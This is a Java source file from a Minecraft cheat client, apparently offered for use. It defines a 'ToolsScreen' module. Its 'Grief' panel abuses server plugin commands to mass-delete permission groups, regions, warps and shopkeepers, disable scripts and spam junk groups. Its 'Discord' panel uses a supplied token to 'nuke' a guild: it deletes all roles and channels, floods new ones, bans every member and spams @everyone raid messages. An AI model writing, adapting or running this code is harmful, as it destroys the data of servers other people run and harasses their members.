/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.render;

import com.mojang.brigadier.suggestion.Suggestion;
import com.mojang.brigadier.suggestion.Suggestions;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.s2c.play.CommandSuggestionsS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.OpenWrittenBookS2CPacket;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.config.BooleanSetting;
import net.shadow.client.feature.config.StringSetting;
import net.shadow.client.feature.gui.clickgui.element.Element;
import net.shadow.client.feature.gui.clickgui.element.impl.config.StringSettingEditor;
import net.shadow.client.feature.gui.notifications.Notification;
import net.shadow.client.feature.gui.panels.PanelsGui;
import net.shadow.client.feature.gui.panels.elements.PanelButton;
import net.shadow.client.feature.gui.panels.elements.PanelFrame;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.discord.DiscordClient;
import net.shadow.client.helper.event.EventType;
import net.shadow.client.helper.event.Events;
import net.shadow.client.helper.event.events.PacketEvent;
import net.shadow.client.helper.util.Utils;

import java.util.Arrays;
import java.util.Random;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class ToolsScreen extends Module {

    final StringSetting token = new StringSetting.Builder("").name("Token").get();
    final StringSetting guild = new StringSetting.Builder("").name("Guild ID").get();
    String packetinputmode = "";
    int blocked = 0;
    boolean enabled = false;
    boolean alt = false;
    PanelsGui menu = null;
    BooleanSetting ban = new BooleanSetting.Builder(true).name("Ban Members").get();
    BooleanSetting roles = new BooleanSetting.Builder(true).name("Nuke roles").get();
    BooleanSetting channels = new BooleanSetting.Builder(true).name("Nuke channels").get();
    BooleanSetting isSelfbot = new BooleanSetting.Builder(false).name("Is Selfbot").get();

    public ToolsScreen() {
        super("ToolsScreen", "The tools screen", ModuleType.RENDER);
        Events.registerEventHandler(EventType.PACKET_RECEIVE, packet2 -> {
            if (!enabled) return;
            PacketEvent event = (PacketEvent) packet2;
            if (event.getPacket() instanceof OpenWrittenBookS2CPacket && !alt) {
                event.setCancelled(true);
                enabled = false;
            }
            if (event.getPacket() instanceof GameMessageS2CPacket && alt) {
                blocked++;
                event.setCancelled(true);
                if (blocked > 2) {
                    blocked = 0;
                    enabled = false;
                    alt = false;
                }
            }
            if (event.getPacket() instanceof GameMessageS2CPacket packet) {
                String message;
                switch (packetinputmode) {
                    case "worldguard" -> {
                        message = packet.getMessage().getString();
                        if (message.contains("------------------- Regions -------------------")) {
                            message = message.replace("------------------- Regions -------------------", "");
                            message = message.trim();
                            message = message.replace("[Info]", "");
                            message = message.trim();
                            String[] arr = message.trim().split(" ");
                            for (String h : arr) {
                                ShadowMain.client.player.sendChatMessage("/rg delete " + h.strip().replace("\n", "").substring(2, h.length()));
                            }
                            enabled = false;
                        }
                    }
                    case "mrl" -> {
                        message = packet.getMessage().getString();
                        if (message.contains(",")) {
                            message = message.replace(",", "");
                            String[] based = message.split(" ");
                            String[] copied = Arrays.copyOfRange(based, 1, based.length);
                            for (String mrl : copied) {
                                ShadowMain.client.player.sendChatMessage("/mrl erase " + mrl);
                            }
                            enabled = false;
                        }
                    }
                }
            }
            if (event.getPacket() instanceof CommandSuggestionsS2CPacket packet) {
                switch (packetinputmode) {
                    case "lp" -> {
                        Suggestions all = packet.getSuggestions();
                        for (Suggestion i : all.getList()) {
                            ShadowMain.client.player.sendChatMessage("/lp deletegroup " + i.getText());
                        }
                        enabled = false;
                    }
                    case "warps" -> {
                        Suggestions alla = packet.getSuggestions();
                        for (Suggestion i : alla.getList()) {
                            ShadowMain.client.player.sendChatMessage("/delwarp " + i.getText());
                        }
                        enabled = false;
                    }
                }
            }
        });
    }

    @Override
    public void tick() {
    }

    @Override
    public void enable() {
        if (menu == null) {
            menu = new PanelsGui(new PanelFrame[] { new PanelFrame(100, 100, 250, 170, "Grief", new Element[] { new PanelButton(0, 0, -1, "Delete LP Data", () -> {
                packetinputmode = "lp";
                enabled = true;
                ShadowMain.client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/lp deletegroup "));
            }), new PanelButton(0, 20, -1, "Delete MRL Data", () -> {
                packetinputmode = "mrl";
                enabled = true;
                ShadowMain.client.player.sendChatMessage("/mrl list");
            }), new PanelButton(0, 40, -1, "Disable Skripts", () -> ShadowMain.client.player.sendChatMessage("/sk disable all")), new PanelButton(0, 60, -1, "Delete Shopkeepers", () -> new Thread(() -> {
                ShadowMain.client.player.sendChatMessage("/shopkeeper deleteall admin");
                Utils.sleep(50);
                ShadowMain.client.player.sendChatMessage("/shopkeeper confirm");
            }).start()), new PanelButton(0, 80, -1, "Spam LP Data", () -> {
                for (int i = 0; i < 100; i++) {
                    ShadowMain.client.player.sendChatMessage("/lp creategroup " + i + new Random().nextInt(10000));
                }
            }), new PanelButton(0, 100, -1, "Delete Warp Data", () -> {
                packetinputmode = "warps";
                enabled = true;
                ShadowMain.client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/delwarp "));
            }), new PanelButton(0, 120, -1, "Delete Region Data", () -> {
                packetinputmode = "worldguard";
                enabled = true;
                ShadowMain.client.player.sendChatMessage("/rg list");
            }) }), new PanelFrame(500, 100, 250, 125, "Discord", new Element[] { new StringSettingEditor(0, 0, 240, token), new StringSettingEditor(0, 30, 240, guild), new PanelButton(0, 65, -1, "Nuke", () -> new Thread(() -> {
                final ThreadPoolExecutor pool = new ThreadPoolExecutor(10, 10, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>());
                try {
                    long guildId = Long.parseLong(guild.getValue());
                    DiscordClient client = new DiscordClient(token.getValue(), true);
                    for (long role : client.getRoles(guildId)) {
                        pool.execute(() -> client.deleteRole(guildId, role));
                        Utils.sleep(50);
                    }
                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all roles");
                    for (int i = 0; i < 250; i++) {
                        pool.execute(() -> client.createRole(guildId, "moles"));
                        Utils.sleep(50);
                    }
                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded roles");
                    for (long channel : client.getChannels(guildId)) {
                        pool.execute(() -> client.deleteChannel(channel));
                        Utils.sleep(50);
                    }
                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all channels");
                    for (int i = 0; i < 500; i++) {
                        pool.execute(() -> client.createChannel(guildId, 0, "molesontop"));
                        Utils.sleep(50);
                    }
                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded channels");
                    for (long member : client.getMembers(guildId)) {
                        pool.execute(() -> client.banMember(guildId, member));
                        Utils.sleep(50);
                    }
                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Banned Members");
                    Notification.create(1000, "Raidbot", Notification.Type.INFO, "Sending pings");
                    for (int i = 0; i < 5; i++) {
                        for (long channel : client.getChannels(guildId)) {
                            pool.execute(() -> client.sendMessage(channel, "@everyone raided by discord.gg/moles", true));
                            Utils.sleep(50);
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start()), }) });
        }
        ShadowMain.client.setScreen(menu);
        this.setEnabled(false);
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
